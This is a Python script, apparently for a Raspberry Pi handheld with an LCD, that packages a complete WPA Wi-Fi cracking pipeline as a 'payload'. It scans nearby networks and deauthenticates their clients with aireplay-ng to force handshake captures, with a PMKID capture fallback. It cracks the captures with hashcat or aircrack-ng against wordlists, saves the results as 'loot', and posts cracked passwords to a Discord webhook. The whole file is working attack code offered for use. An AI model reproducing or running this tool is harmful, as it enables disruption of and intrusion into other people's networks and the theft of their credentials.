#!/usr/bin/env python3
"""
KTOx payload - Auto Crack Pipeline (Any Wordlist)
===================================================
Author: wickednull

Features:
- Browse any wordlist file from any directory
- Handshake + PMKID capture (fallback)
- Signal strength bar graph
- Real-time cracking progress (hashcat)
- Discord notifications

Controls:
- UP/DOWN: scroll targets
- OK: select target and start pipeline
- KEY1: toggle deauth burst
- KEY2: cycle wordlist / browse
- KEY3: exit
"""

import os
import sys
import re
import time
import threading
import subprocess
import requests
from datetime import datetime

# ----------------------------------------------------------------------
# Hardware & LCD
# ----------------------------------------------------------------------
try:
    import RPi.GPIO as GPIO
    import LCD_1in44
    from PIL import Image, ImageDraw, ImageFont
    HAS_HW = True
except ImportError:
    HAS_HW = False
    print("Hardware not detected – exiting")
    sys.exit(1)

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = 128, 128

def load_font(size=9):
    try:
        return ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", size)
    except:
        return ImageFont.load_default()

font_sm = load_font(9)
font_md = load_font(11)

# ----------------------------------------------------------------------
# Constants & Directories
# ----------------------------------------------------------------------
LOOT_DIR = "/root/KTOx/loot/AutoCrack"
os.makedirs(LOOT_DIR, exist_ok=True)

WEBHOOK_FILE = "/root/KTOx/discord_webhook.txt"
_stop = threading.Event()

# ----------------------------------------------------------------------
# File Browser (embedded)
# ----------------------------------------------------------------------
def browse_file(start_path="/", extensions=None):
    """Full-screen file browser – returns selected file path or None."""
    extensions = extensions or [".txt"]
    current_path = os.path.abspath(start_path)
    history = []
    selected_idx = 0
    scroll = 0
    rows = 8

    def get_entries(path):
        try:
            items = sorted(os.listdir(path))
            dirs = [d for d in items if os.path.isdir(os.path.join(path, d))]
            files = [f for f in items if os.path.isfile(os.path.join(path, f))]
            if extensions:
                files = [f for f in files if any(f.lower().endswith(ext) for ext in extensions)]
            return dirs + files
        except:
            return []

    def draw(entries, sel, sc, path):
        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
        d = ImageDraw.Draw(img)
        d.rectangle((0,0,127,16), fill="#004466")
        header = path if len(path) < 20 else "..." + path[-17:]
        d.text((2,2), header[:20], font=font_sm, fill="cyan")
        y = 20
        for i in range(rows):
            idx = sc + i
            if idx >= len(entries):
                break
            name = entries[idx]
            if len(name) > 20:
                name = name[:18] + ".."
            color = "white"
            if idx == sel:
                color = "yellow"
                d.rectangle((0, y-1, WIDTH, y+9), fill="#224466")
            if os.path.isdir(os.path.join(path, name)):
                name = "/" + name
            d.text((4, y), name, font=font_sm, fill=color)
            y += 11
        d.rectangle((0, HEIGHT-12, WIDTH, HEIGHT), fill="#111")
        d.text((2, HEIGHT-10), "UP/DOWN OK=sel K3=back", font=font_sm, fill="#AAA")
        LCD.LCD_ShowImage(img, 0, 0)

    def wait_button():
        while True:
            for name, pin in PINS.items():
                if GPIO.input(pin) == 0:
                    time.sleep(0.05)
                    return name
            time.sleep(0.02)

    while True:
        entries = get_entries(current_path)
        if not entries:
            img = Image.new("RGB", (WIDTH, HEIGHT), "black")
            d = ImageDraw.Draw(img)
            d.text((4,50), "Empty folder", font=font_sm, fill="red")
            d.text((4,70), "KEY3 to go back", font=font_sm, fill="gray")
            LCD.LCD_ShowImage(img, 0, 0)
            while True:
                btn = wait_button()
                if btn == "KEY3":
                    if history:
                        current_path = history.pop()
                        break
                    else:
                        return None
                time.sleep(0.05)
            continue

        draw(entries, selected_idx, scroll, current_path)
        btn = wait_button()
        if btn == "KEY3":
            if history:
                current_path = history.pop()
                selected_idx = 0
                scroll = 0
            else:
                return None
        elif btn == "UP":
            selected_idx = (selected_idx - 1) % len(entries)
            if selected_idx < scroll:
                scroll = selected_idx
        elif btn == "DOWN":
            selected_idx = (selected_idx + 1) % len(entries)
            if selected_idx >= scroll + rows:
                scroll = selected_idx - rows + 1
        elif btn == "OK":
            selected = entries[selected_idx]
            full = os.path.join(current_path, selected)
            if os.path.isdir(full):
                history.append(current_path)
                current_path = full
                selected_idx = 0
                scroll = 0
            else:
                return full
        time.sleep(0.05)

# ----------------------------------------------------------------------
# Helper functions
# ----------------------------------------------------------------------
def get_webhook():
    try:
        with open(WEBHOOK_FILE) as f:
            return f.read().strip()
    except:
        return ""

def notify(msg):
    url = get_webhook()
    if not url:
        return
    try:
        requests.post(url, json={"content": f"**[KTOx AutoCrack]** {msg}", timeout=5})
    except:
        pass

def run_cmd(cmd, timeout=30):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout + r.stderr
    except Exception as e:
        return str(e)

# ----------------------------------------------------------------------
# Monitor mode management
# ----------------------------------------------------------------------
def enable_monitor(iface="wlan0"):
    run_cmd(f"ip link set {iface} down")
    run_cmd(f"iw dev {iface} set type monitor")
    run_cmd(f"ip link set {iface} up")
    mon = iface + "mon"
    if not run_cmd(f"iw dev {mon} info 2>/dev/null"):
        run_cmd(f"airmon-ng start {iface} 2>/dev/null")
    return mon

def disable_monitor(iface="wlan0"):
    run_cmd(f"airmon-ng stop {iface}mon 2>/dev/null")
    run_cmd(f"ip link set {iface} down")
    run_cmd(f"iw dev {iface} set type managed")
    run_cmd(f"ip link set {iface} up")

# ----------------------------------------------------------------------
# LCD drawing functions
# ----------------------------------------------------------------------
def draw_screen(lines, title="AUTO CRACK", title_color="#8B0000", text_color="#FFBBBB"):
    img = Image.new("RGB", (WIDTH, HEIGHT), "#0A0000")
    draw = ImageDraw.Draw(img)
    draw.rectangle((0, 0, WIDTH, 17), fill=title_color)
    draw.text((4, 3), title[:20], font=font_sm, fill="#FF3333" if title_color=="#8B0000" else "white")
    y = 20
    for line in lines[:7]:
        draw.text((4, y), line[:23], font=font_sm, fill=text_color)
        y += 12
    draw.rectangle((0, HEIGHT-12, WIDTH, HEIGHT), fill="#220000")
    draw.text((4, HEIGHT-10), "UP/DN OK KEY1/2 K3", font=font_sm, fill="#FF7777")
    LCD.LCD_ShowImage(img, 0, 0)

def draw_signal_bar(draw, x, y, strength, max_width=24):
    bar_len = int((strength + 90) / 60 * max_width)
    bar_len = max(0, min(max_width, bar_len))
    draw.rectangle((x, y, x+bar_len, y+6), fill="#00FF00")
    draw.rectangle((x+bar_len, y, x+max_width, y+6), fill="#333333")
    draw.text((x+max_width+2, y-1), str(strength), font=font_sm, fill="#AAAAAA")

def wait_button(timeout=0.1):
    t0 = time.time()
    while time.time() - t0 < timeout:
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                time.sleep(0.05)
                return name
        time.sleep(0.02)
    return None

# ----------------------------------------------------------------------
# Target scanning with signal strength
# ----------------------------------------------------------------------
def scan_targets(mon):
    draw_screen(["Scanning targets...", "Please wait ~15s"])
    tmp = f"/tmp/ktox_scan_{int(time.time())}"
    proc = subprocess.Popen(
        f"airodump-ng --output-format csv -w {tmp} {mon}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(15)
    proc.terminate()
    time.sleep(1)

    targets = []  # (bssid, ch, essid, signal)
    csv_file = f"{tmp}-01.csv"
    if os.path.exists(csv_file):
        with open(csv_file, errors="ignore") as f:
            lines = f.readlines()
        in_aps = True
        for line in lines:
            if "Station MAC" in line:
                in_aps = False
                continue
            if not in_aps or not line.strip() or "BSSID" in line:
                continue
            parts = [p.strip() for p in line.split(",")]
            if len(parts) >= 14 and re.match(r"([0-9A-Fa-f]{2}:){5}", parts[0]):
                bssid = parts[0]
                ch = parts[3].strip()
                essid = parts[13].strip()
                signal_str = parts[8].strip()
                try:
                    signal = int(signal_str)
                except:
                    signal = -90
                if essid and essid != "(not associated)":
                    targets.append((bssid, ch, essid, signal))
        for f in [csv_file, f"{tmp}-01.kismet.csv", f"{tmp}-01.kismet.netxml"]:
            try: os.remove(f)
            except: pass
    return targets

# ----------------------------------------------------------------------
# Capture handshake
# ----------------------------------------------------------------------
def capture_handshake(mon, bssid, ch, essid, do_deauth):
    safe = re.sub(r"[^a-zA-Z0-9_-]", "_", essid)[:20]
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_dir = os.path.join(LOOT_DIR, f"{safe}_{ts}")
    os.makedirs(out_dir, exist_ok=True)
    cap_base = os.path.join(out_dir, "capture")

    draw_screen([f"ESSID: {essid[:16]}", f"CH: {ch}  BSSID:", bssid[:17], "Waiting 4-way hs..."])
    proc = subprocess.Popen(
        f"airodump-ng -c {ch} --bssid {bssid} -w {cap_base} --output-format pcap {mon}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    if do_deauth:
        time.sleep(5)
        draw_screen([f"{essid[:16]}", "Forcing reconnect..."])
        run_cmd(f"aireplay-ng --deauth 10 -a {bssid} {mon} 2>/dev/null", timeout=15)
    time.sleep(20)
    proc.terminate()
    time.sleep(1)

    caps = [f for f in os.listdir(out_dir) if f.endswith(".cap")]
    if not caps:
        return None, out_dir
    return os.path.join(out_dir, caps[0]), out_dir

# ----------------------------------------------------------------------
# PMKID capture fallback
# ----------------------------------------------------------------------
def capture_pmkid(mon, bssid, ch, essid):
    safe = re.sub(r"[^a-zA-Z0-9_-]", "_", essid)[:20]
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_dir = os.path.join(LOOT_DIR, f"pmkid_{safe}_{ts}")
    os.makedirs(out_dir, exist_ok=True)
    draw_screen([f"PMKID capture", f"ESSID: {essid[:16]}", f"CH: {ch}", "Using hcxdumptool..."])
    pcapng = os.path.join(out_dir, "capture.pcapng")
    run_cmd(f"hcxdumptool -i {mon} -o {pcapng} --enable_status=1 -c {ch} --filterlist={bssid} --filtermode=2", timeout=30)
    hash_file = os.path.join(out_dir, "pmkid.16800")
    run_cmd(f"hcxpcaptool -z {hash_file} {pcapng} 2>/dev/null")
    if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
        return hash_file, out_dir
    return None, out_dir

# ----------------------------------------------------------------------
# Validation
# ----------------------------------------------------------------------
def validate_handshake(cap_path):
    out = run_cmd(f"aircrack-ng {cap_path} 2>/dev/null")
    return "handshake" in out.lower()

# ----------------------------------------------------------------------
# Cracking with progress (hashcat)
# ----------------------------------------------------------------------
def crack_with_hashcat(hash_file, hash_mode, wordlist, essid, out_dir):
    draw_screen(["hashcat running...", f"Mode: {hash_mode}", "0%"], title_color="#444400")
    cmd = f"hashcat -m {hash_mode} {hash_file} {wordlist} --force --status --status-timer=5 --potfile-disable"
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    password = None
    try:
        for line in iter(proc.stdout.readline, ''):
            if not line:
                break
            if "STATUS" in line:
                m = re.search(r'(\d+\.?\d*)%', line)
                if m:
                    percent = m.group(1)
                    draw_screen([f"Cracking... {percent}%", f"Wordlist: {os.path.basename(wordlist)}", "K1=stop"], title_color="#444400")
            if ":" in line and essid in line:
                parts = line.strip().split(":")
                if len(parts) >= 2:
                    password = parts[-1]
                    break
        proc.wait(timeout=5)
    except:
        proc.terminate()
    return password

def crack_fallback_aircrack(cap_path, wordlist):
    out = run_cmd(f"aircrack-ng -w {wordlist} {cap_path} 2>/dev/null", timeout=300)
    m = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", out)
    return m.group(1) if m else None

def crack_handshake(cap_path, essid, wordlist):
    hccapx = cap_path.replace(".cap", ".hccapx")
    run_cmd(f"cap2hccapx {cap_path} {hccapx} 2>/dev/null")
    if os.path.exists(hccapx):
        pwd = crack_with_hashcat(hccapx, 2500, wordlist, essid, os.path.dirname(cap_path))
        if pwd:
            return pwd
    return crack_fallback_aircrack(cap_path, wordlist)

def crack_pmkid(pmkid_file, essid, wordlist):
    return crack_with_hashcat(pmkid_file, 16800, wordlist, essid, os.path.dirname(pmkid_file))

# ----------------------------------------------------------------------
# Wordlist management (dynamic, with browse)
# ----------------------------------------------------------------------
def get_predefined_wordlists():
    """Return list of (display_name, path) for predefined wordlists that exist."""
    candidates = [
        ("rockyou", "/usr/share/wordlists/rockyou.txt"),
        ("custom", "/root/KTOx/loot/wordlists/custom.txt"),
        ("default", "/usr/share/john/password.lst"),
        ("10M", "/root/KTOx/loot/wordlists/10_million_pass.txt"),
    ]
    return [(name, path) for name, path in candidates if os.path.exists(path)]

def select_wordlist(current_path, predef_list, wl_index):
    """
    Cycle through: predef_list entries, then a special "[ Browse... ]" entry.
    Returns (new_path, new_index) where new_index is the position in the combined list.
    """
    combined = predef_list + [("[ Browse... ]", None)]
    if wl_index >= len(combined):
        wl_index = 0
    # If current selection is Browse and user presses KEY2 again, move to next
    new_index = (wl_index + 1) % len(combined)
    if combined[new_index][1] is None:
        # Browse selected: open file browser
        browsed = browse_file("/", [".txt"])
        if browsed:
            # Insert this custom wordlist into the list (temporarily replace Browse)
            # We'll just return it and set index to the position where we store it?
            # Simpler: return the browsed path and keep index as the browse entry index.
            # But we need to remember it for the rest of the session.
            return browsed, new_index, True  # True means custom path
    else:
        return combined[new_index][1], new_index, False
    return current_path, wl_index, False

# ----------------------------------------------------------------------
# Main loop
# ----------------------------------------------------------------------
def main():
    iface = "wlan0"
    mon = None
    try:
        draw_screen(["Enabling monitor mode..."])
        mon = enable_monitor(iface)
        time.sleep(2)

        targets = scan_targets(mon)
        if not targets:
            draw_screen(["No APs found", "KEY3 to exit"], text_color="#FF8888")
            while wait_button(0.5) != "KEY3":
                pass
            return

        cursor = 0
        do_deauth = True
        # Wordlist selection state
        predef = get_predefined_wordlists()
        # combined list for display: predef + Browse
        combined_items = predef + [("[ Browse... ]", None)]
        wl_index = 0
        current_wordlist_path = predef[0][1] if predef else None
        current_wordlist_name = predef[0][0] if predef else "None"

        # Target selection loop
        while True:
            bssid, ch, essid, signal = targets[cursor]
            # Determine display name for current wordlist
            if wl_index < len(predef):
                wl_display = predef[wl_index][0]
            else:
                wl_display = "Browse..."
            # Build lines
            lines = [
                f"> {essid[:18]}",
                f"  {bssid}",
                f"  CH:{ch}  PWR:{signal}dBm",
                f"  [{cursor+1}/{len(targets)}]  WL:{wl_display[:6]}",
                "",
                "OK=select  KEY2=WL",
                f"KEY1=deauth:{'ON' if do_deauth else 'OFF'}"
            ]
            # Custom draw with signal bar
            img = Image.new("RGB", (WIDTH, HEIGHT), "#0A0000")
            draw = ImageDraw.Draw(img)
            draw.rectangle((0, 0, WIDTH, 17), fill="#8B0000")
            draw.text((4, 3), "SELECT TARGET", font=font_sm, fill="#FF3333")
            y = 20
            for i, line in enumerate(lines):
                draw.text((4, y), line[:23], font=font_sm, fill="#FFBBBB")
                if i == 2:  # signal line
                    draw_signal_bar(draw, 80, y, signal)
                y += 12
            draw.rectangle((0, HEIGHT-12, WIDTH, HEIGHT), fill="#220000")
            draw.text((4, HEIGHT-10), "UP/DN OK KEY1/2 K3", font=font_sm, fill="#FF7777")
            LCD.LCD_ShowImage(img, 0, 0)

            btn = wait_button(0.5)
            if btn == "UP":
                cursor = (cursor - 1) % len(targets)
            elif btn == "DOWN":
                cursor = (cursor + 1) % len(targets)
            elif btn == "KEY1":
                do_deauth = not do_deauth
            elif btn == "KEY2":
                # Cycle wordlist
                old_index = wl_index
                wl_index = (wl_index + 1) % len(combined_items)
                if combined_items[wl_index][1] is None:
                    # Browse selected: open file browser
                    browsed = browse_file("/", [".txt"])
                    if browsed:
                        # Store this custom wordlist as a temporary entry
                        # We'll replace the Browse slot with this custom path
                        # For simplicity, we create a new combined list where Browse is replaced by custom
                        # But we need to persist it. Let's just set current_wordlist_path to browsed
                        current_wordlist_path = browsed
                        current_wordlist_name = os.path.basename(browsed)[:12]
                        # Keep wl_index at the browse slot but mark as custom
                        # We'll show the custom name instead of "Browse..."
                        wl_display = current_wordlist_name
                    else:
                        # Cancel browse, revert to previous index
                        wl_index = old_index
                else:
                    # Predefined wordlist selected
                    current_wordlist_path = combined_items[wl_index][1]
                    current_wordlist_name = combined_items[wl_index][0]
            elif btn == "KEY3":
                return
            elif btn == "OK":
                break
            time.sleep(0.05)

        bssid, ch, essid, signal = targets[cursor]
        wl_path = current_wordlist_path
        wl_name = current_wordlist_name

        if not wl_path or not os.path.exists(wl_path):
            draw_screen(["No valid wordlist", "KEY3 to exit"], text_color="#FF4444")
            while wait_button(0.5) != "KEY3":
                pass
            return

        # Step 1: Capture handshake
        cap_path, out_dir = capture_handshake(mon, bssid, ch, essid, do_deauth)

        valid_hs = False
        if cap_path:
            draw_screen([f"{essid[:18]}", "Checking handshake..."])
            valid_hs = validate_handshake(cap_path)

        if not valid_hs:
            draw_screen(["Handshake invalid", "Trying PMKID capture..."], text_color="#FF8800")
            notify(f"Handshake invalid for {essid}, trying PMKID")
            pmkid_file, pmkid_dir = capture_pmkid(mon, bssid, ch, essid)
            if pmkid_file:
                cap_path = pmkid_file
                is_pmkid = True
            else:
                draw_screen(["PMKID capture failed", "KEY3 to exit"], text_color="#FF4444")
                notify(f"Capture failed for {essid}")
                while wait_button(0.5) != "KEY3":
                    pass
                return
        else:
            is_pmkid = False

        # Step 2: Crack
        notify(f"Captured: {essid} ({bssid}) - starting crack with {wl_name}")
        draw_screen(["Starting crack...", f"Wordlist: {wl_name}", "This may take a while"])

        if is_pmkid:
            password = crack_pmkid(cap_path, essid, wl_path)
        else:
            password = crack_handshake(cap_path, essid, wl_path)

        if password:
            draw_screen([f"ESSID: {essid[:16]}", f"PASS: {password[:18]}"], title_color="#00AA00")
            notify(f"Password cracked! {essid} = {password}")
            with open(os.path.join(out_dir, "cracked.txt"), "w") as f:
                f.write(f"ESSID: {essid}\nBSSID: {bssid}\nPASSWORD: {password}\nWordlist: {wl_name}\nDate: {datetime.now().isoformat()}\n")
        else:
            draw_screen(["Not cracked", "Capture saved", out_dir[-25:]], text_color="#FF8800")
            notify(f"Capture saved for {essid} - not cracked with {wl_name}")

        while wait_button(0.5) != "KEY3":
            pass

    except KeyboardInterrupt:
        pass
    finally:
        if mon:
            disable_monitor(iface)
        GPIO.cleanup()
        print("[AutoCrack] Exited.")

if __name__ == "__main__":
    main()
